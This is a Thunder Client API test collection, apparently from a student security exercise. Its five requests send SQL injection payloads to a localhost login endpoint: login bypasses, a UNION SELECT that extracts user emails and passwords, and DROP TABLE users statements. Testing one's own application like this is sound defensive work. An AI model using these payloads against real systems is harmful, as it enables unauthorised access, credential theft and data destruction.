@@ -1,0 +1,96 @@
+{
+    "clientName": "Thunder Client",
+    "collectionName": "Actividad03",
+    "collectionId": "f8875409-74e0-43b5-a299-26ad29c511e6",
+    "dateExported": "2025-03-26T02:33:06.293Z",
+    "version": "1.2",
+    "folders": [],
+    "requests": [
+        {
+            "_id": "65167bf2-8638-446e-9577-e201c67941cc",
+            "colId": "f8875409-74e0-43b5-a299-26ad29c511e6",
+            "containerId": "",
+            "name": "Iniciar sesión con SQL Injection en el campo de correo",
+            "url": "http://localhost:3000/User/login",
+            "method": "POST",
+            "sortNum": 20000,
+            "created": "2025-03-26T02:23:25.303Z",
+            "modified": "2025-03-26T02:23:52.527Z",
+            "headers": [],
+            "body": {
+                "type": "json",
+                "raw": "{\r\n  \"email\": \"' OR '1'='1\",\r\n  \"password\": \"password123\"\r\n}",
+                "form": []
+            }
+        },
+        {
+            "_id": "69e21984-a017-4532-bcb3-76f53231666b",
+            "colId": "f8875409-74e0-43b5-a299-26ad29c511e6",
+            "containerId": "",
+            "name": "Intento de SQL Injection con comentarios",
+            "url": "http://localhost:3000/User/login",
+            "method": "POST",
+            "sortNum": 30000,
+            "created": "2025-03-26T02:28:59.189Z",
+            "modified": "2025-03-26T02:29:40.611Z",
+            "headers": [],
+            "body": {
+                "type": "json",
+                "raw": "{\r\n  \"email\": \"' OR 1=1 --\",\r\n  \"password\": \"password123\"\r\n}",
+                "form": []
+            }
+        },
+        {
+            "_id": "9adc4989-f01d-4a42-a1a9-ef1a44238f9b",
+            "colId": "f8875409-74e0-43b5-a299-26ad29c511e6",
+            "containerId": "",
+            "name": "Inyección para extraer datos de usuarios",
+            "url": "http://localhost:3000/User/login",
+            "method": "POST",
+            "sortNum": 40000,
+            "created": "2025-03-26T02:30:00.386Z",
+            "modified": "2025-03-26T02:30:24.979Z",
+            "headers": [],
+            "body": {
+                "type": "json",
+                "raw": "{\r\n  \"email\": \"admin@example.com' UNION SELECT null, email, password FROM users --\",\r\n  \"password\": \"password123\"\r\n}",
+                "form": []
+            }
+        },
+        {
+            "_id": "0a4ed9ea-1c61-49fb-862c-e6ebf5bb878f",
+            "colId": "f8875409-74e0-43b5-a299-26ad29c511e6",
+            "containerId": "",
+            "name": "Inyección con un intento de eliminación de la tabla",
+            "url": "http://localhost:3000/User/login",
+            "method": "POST",
+            "sortNum": 50000,
+            "created": "2025-03-26T02:30:57.553Z",
+            "modified": "2025-03-26T02:31:19.654Z",
+            "headers": [],
+            "body": {
+                "type": "json",
+                "raw": "{\r\n  \"email\": \"'; DROP TABLE users; --\",\r\n  \"password\": \"password123\"\r\n}",
+                "form": []
+            }
+        },
+        {
+            "_id": "eac701da-d36d-4c10-9ff8-d991794b32f3",
+            "colId": "f8875409-74e0-43b5-a299-26ad29c511e6",
+            "containerId": "",
+            "name": "Intento de inyección en el registro de usuario",
+            "url": "http://localhost:3000/User/login",
+            "method": "POST",
+            "sortNum": 60000,
+            "created": "2025-03-26T02:31:37.850Z",
+            "modified": "2025-03-26T02:31:54.361Z",
+            "headers": [],
+            "body": {
+                "type": "json",
+                "raw": "{\r\n  \"email\": \"hacker@example.com'); DROP TABLE users; --\",\r\n  \"password\": \"Secure123\"\r\n}",
+                "form": []
+            }
+        }
+    ],
+    "ref": "anCovZCeTo4-6dcWikZGpaBYUtiCUuCUxZUAvRbhz_7IpEX5CKwFhIkGD27HBh8nKEsgDLjJMJ375mYGbSGTQQ"
+}
